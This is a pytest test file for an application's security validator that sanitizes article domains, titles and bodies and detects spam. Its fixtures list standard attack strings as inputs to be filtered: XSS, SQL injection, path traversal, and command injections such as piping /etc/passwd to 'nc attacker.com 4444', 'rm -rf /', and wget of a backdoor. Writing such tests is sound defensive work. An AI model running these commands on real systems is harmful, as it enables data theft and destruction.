"""
Tests for security validation and sanitization
"""
import pytest
from app.utils.security import SecurityValidator, sanitize_for_processing


class TestSecurityValidator:
    """Test security validation functionality"""
    
    def test_sanitize_text_basic(self):
        """Test basic text sanitization"""
        text = "This is normal text."
        result = SecurityValidator.sanitize_text(text)
        assert result == "This is normal text."
    
    def test_sanitize_text_html_removal(self):
        """Test HTML tag removal"""
        text = "This is <script>alert('xss')</script> dangerous text."
        result = SecurityValidator.sanitize_text(text, allow_html=False)
        assert "<script>" not in result
        assert "alert(" not in result  # The dangerous pattern should be filtered
        assert "dangerous text" in result or "[FILTERED]" in result
    
    def test_sanitize_text_html_escaping(self):
        """Test HTML escaping when allowed"""
        text = "This is <b>bold</b> text."
        result = SecurityValidator.sanitize_text(text, allow_html=True)
        assert "&lt;b&gt;" in result
        assert "&lt;/b&gt;" in result
        assert "bold" in result
    
    def test_sanitize_text_script_injection(self):
        """Test script injection prevention"""
        malicious_texts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<iframe src='malicious.com'></iframe>",
            "<img onerror='alert(1)' src='x'>",
            "onload=alert(1)",
            "vbscript:msgbox('xss')"
        ]
        
        for malicious_text in malicious_texts:
            result = SecurityValidator.sanitize_text(malicious_text)
            # Check that dangerous content is filtered
            # Either replaced with [FILTERED] or significantly reduced in size
            assert ("[FILTERED]" in result or 
                   len(result) <= len(malicious_text) * 0.5 or
                   result.strip() == "")
    
    def test_sanitize_text_sql_injection(self):
        """Test SQL injection prevention"""
        sql_injections = [
            "'; DROP TABLE users; --",
            "UNION SELECT * FROM passwords",
            "INSERT INTO users VALUES ('hacker')",
            "UPDATE users SET password='hacked'",
            "DELETE FROM important_data"
        ]
        
        for injection in sql_injections:
            result = SecurityValidator.sanitize_text(injection)
            assert "drop table" not in result.lower()
            assert "union select" not in result.lower()
            assert "insert into" not in result.lower()
            assert "delete from" not in result.lower()
    
    def test_sanitize_text_command_injection(self):
        """Test command injection prevention"""
        command_injections = [
            "; rm -rf /",
            "| nc attacker.com 4444",
            "`curl malicious.com`",
            "$(wget evil.com)",
            "; curl -X POST evil.com"
        ]
        
        for injection in command_injections:
            result = SecurityValidator.sanitize_text(injection)
            assert "rm -rf" not in result
            assert "nc " not in result
            assert "curl" not in result
            assert "wget" not in result
    
    def test_sanitize_text_path_traversal(self):
        """Test path traversal prevention"""
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc//passwd"
        ]
        
        for attack in path_attacks:
            result = SecurityValidator.sanitize_text(attack)
            # Path traversal patterns should be filtered out
            assert "[FILTERED]" in result or len(result) < len(attack)
    
    def test_validate_domain_valid(self):
        """Test valid domain validation"""
        valid_domains = [
            "example.com",
            "test.example.com",
            "my-domain.co.uk",
            "123domain.org"
        ]
        
        for domain in valid_domains:
            is_valid, error = SecurityValidator.validate_domain(domain)
            assert is_valid is True
            assert error == ""
    
    def test_validate_domain_invalid(self):
        """Test invalid domain validation"""
        invalid_domains = [
            "",
            "x",
            "example..com",
            "-example.com",
            "example.com-",
            "ex ample.com",
            "<script>alert(1)</script>.com"
        ]
        
        for domain in invalid_domains:
            is_valid, error = SecurityValidator.validate_domain(domain)
            assert is_valid is False
            assert len(error) > 0
    
    def test_validate_domain_suspicious(self):
        """Test suspicious domain detection"""
        suspicious_domains = [
            "bit.ly",
            "tinyurl.com",
            "phishing.com"
        ]
        
        for domain in suspicious_domains:
            is_valid, error = SecurityValidator.validate_domain(domain)
            assert is_valid is False
            assert "suspicious" in error.lower()
    
    def test_validate_article_content_valid(self):
        """Test valid article content"""
        valid_content = "This is a valid article with sufficient content for processing. " * 3
        is_valid, error = SecurityValidator.validate_article_content(valid_content)
        assert is_valid is True
        assert error == ""
    
    def test_validate_article_content_too_short(self):
        """Test article content too short"""
        short_content = "Too short"
        is_valid, error = SecurityValidator.validate_article_content(short_content)
        assert is_valid is False
        assert "too short" in error.lower()
    
    def test_validate_article_content_too_long(self):
        """Test article content too long"""
        long_content = "x" * (SecurityValidator.MAX_ARTICLE_LENGTH + 1)
        is_valid, error = SecurityValidator.validate_article_content(long_content)
        assert is_valid is False
        assert "too long" in error.lower()
    
    def test_validate_article_content_suspicious(self):
        """Test suspicious article content detection"""
        suspicious_content = "This has <script>alert(1)</script> and {{{malicious}}} content."
        is_valid, error = SecurityValidator.validate_article_content(suspicious_content)
        assert is_valid is False
        assert "suspicious" in error.lower()
    
    def test_validate_article_content_spam(self):
        """Test spam detection"""
        spam_content = "buy now " * 50  # Excessive repetition
        is_valid, error = SecurityValidator.validate_article_content(spam_content)
        assert is_valid is False
        assert "spam" in error.lower()
    
    def test_validate_title_valid(self):
        """Test valid title validation"""
        valid_titles = [
            "Valid Article Title",
            "AI Technology Trends 2024",
            "How to Build Secure Applications"
        ]
        
        for title in valid_titles:
            is_valid, error = SecurityValidator.validate_title(title)
            assert is_valid is True
            assert error == ""
    
    def test_validate_title_invalid(self):
        """Test invalid title validation"""
        invalid_titles = [
            "",
            "x",
            "x" * (SecurityValidator.MAX_TITLE_LENGTH + 1),
            "<script>alert('xss')</script>",
            "javascript:alert(1)"
        ]
        
        for title in invalid_titles:
            is_valid, error = SecurityValidator.validate_title(title)
            assert is_valid is False
            assert len(error) > 0
    
    def test_sanitize_article_data(self):
        """Test comprehensive data sanitization"""
        malicious_data = {
            'companyDomain': '<script>alert(1)</script>example.com',
            'articleTitle': 'Title with <b>HTML</b> tags',
            'article': 'Article with <script>evil</script> content and sql injection; DROP TABLE users;'
        }
        
        sanitized = SecurityValidator.sanitize_article_data(malicious_data)
        
        assert '<script>' not in sanitized['company_domain']
        assert 'example.com' in sanitized['company_domain']
        assert '<b>' not in sanitized['article_title']
        assert 'Title with' in sanitized['article_title']
        assert 'drop table' not in sanitized['article'].lower()
        assert 'Article with' in sanitized['article']
    
    def test_comprehensive_validation_valid(self):
        """Test comprehensive validation with valid data"""
        valid_data = {
            'companyDomain': 'example.com',
            'articleTitle': 'Valid Article Title',
            'article': 'This is a valid article with sufficient content for processing and analysis. ' * 5
        }
        
        is_valid, errors = SecurityValidator.comprehensive_validation(valid_data)
        assert is_valid is True
        assert len(errors) == 0
    
    def test_comprehensive_validation_invalid(self):
        """Test comprehensive validation with invalid data"""
        invalid_data = {
            'companyDomain': '<script>alert(1)</script>',
            'articleTitle': '',
            'article': 'short'
        }
        
        is_valid, errors = SecurityValidator.comprehensive_validation(invalid_data)
        assert is_valid is False
        assert len(errors) > 0
        assert any('domain' in error.lower() for error in errors)
        assert any('title' in error.lower() for error in errors)
        assert any('article' in error.lower() for error in errors)
    
    def test_spam_detection(self):
        """Test spam pattern detection"""
        spam_texts = [
            "buy now " * 30,  # Excessive repetition
            "Click here! Act now! Buy now! Limited time!",  # Multiple spam phrases
            "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"  # Excessive punctuation
        ]
        
        for spam_text in spam_texts:
            is_spam = SecurityValidator._detect_spam_patterns(spam_text)
            assert is_spam is True
    
    def test_non_spam_detection(self):
        """Test that normal content is not flagged as spam"""
        normal_texts = [
            "This is a normal article about technology trends.",
            "How to build secure web applications using modern frameworks.",
            "The future of artificial intelligence in business applications."
        ]
        
        for normal_text in normal_texts:
            is_spam = SecurityValidator._detect_spam_patterns(normal_text)
            assert is_spam is False


class TestSecurityIntegration:
    """Integration tests for security features"""
    
    def test_sanitize_for_processing(self):
        """Test the convenience sanitization function"""
        malicious_text = "<script>alert('xss')</script>Normal content here"
        result = sanitize_for_processing(malicious_text)
        
        assert "<script>" not in result
        assert "Normal content here" in result
    
    def test_security_with_realistic_attack_payloads(self):
        """Test with realistic attack payloads"""
        attack_payloads = [
            # XSS attempts
            "<img src=x onerror=alert(1)>",
            "javascript:eval(atob('YWxlcnQoMSk='))",
            
            # SQL injection attempts
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR '1'='1' UNION SELECT password FROM users --",
            
            # Command injection attempts
            "; cat /etc/passwd | nc attacker.com 4444",
            "`wget http://malicious.com/backdoor.php`",
            
            # Template injection
            "{{7*7}}",
            "{%for item in range(10)%}test{%endfor%}",
            
            # LDAP injection
            "*)(&(objectClass=*))",
            
            # Path traversal
            "../../../windows/system32/drivers/etc/hosts"
        ]
        
        for payload in attack_payloads:
            # Test domain validation
            is_valid, _ = SecurityValidator.validate_domain(payload)
            assert is_valid is False
            
            # Test text sanitization
            sanitized = SecurityValidator.sanitize_text(payload)
            
            # Dangerous content should be filtered or validation should fail
            # Some payloads might not match patterns but should still be caught by validation
            if payload not in ["*)(&(objectClass=*))"]:  # Skip LDAP injection pattern test
                assert ("[FILTERED]" in sanitized or 
                       len(sanitized) < len(payload) * 0.8)
    
    def test_length_limits_enforcement(self):
        """Test that length limits are properly enforced"""
        # Test domain length limit
        long_domain = "a" * (SecurityValidator.MAX_DOMAIN_LENGTH + 1) + ".com"
        is_valid, error = SecurityValidator.validate_domain(long_domain)
        assert is_valid is False
        assert "too long" in error.lower()
        
        # Test title length limit
        long_title = "x" * (SecurityValidator.MAX_TITLE_LENGTH + 1)
        is_valid, error = SecurityValidator.validate_title(long_title)
        assert is_valid is False
        assert "too long" in error.lower()
        
        # Test article length limit
        long_article = "x" * (SecurityValidator.MAX_ARTICLE_LENGTH + 1)
        is_valid, error = SecurityValidator.validate_article_content(long_article)
        assert is_valid is False
        assert "too long" in error.lower()
    
    def test_edge_cases(self):
        """Test edge cases and boundary conditions"""
        edge_cases = [
            None,
            "",
            " " * 100,
            "\x00\x01\x02",  # Control characters
            "🚀🌟💻",  # Unicode/emoji
            "Hello\r\nWorld\r\n",  # Different line endings
            "Mixed\tTabs\nAnd   Spaces"  # Mixed whitespace
        ]
        
        for case in edge_cases:
            # Should not crash on any input
            try:
                if case is not None:
                    sanitized = SecurityValidator.sanitize_text(case)
                    assert isinstance(sanitized, str)
                
                # Domain validation should handle gracefully
                is_valid, error = SecurityValidator.validate_domain(case)
                assert isinstance(is_valid, bool)
                assert isinstance(error, str)
                
            except Exception as e:
                pytest.fail(f"Security validator crashed on input: {repr(case)}, Error: {e}")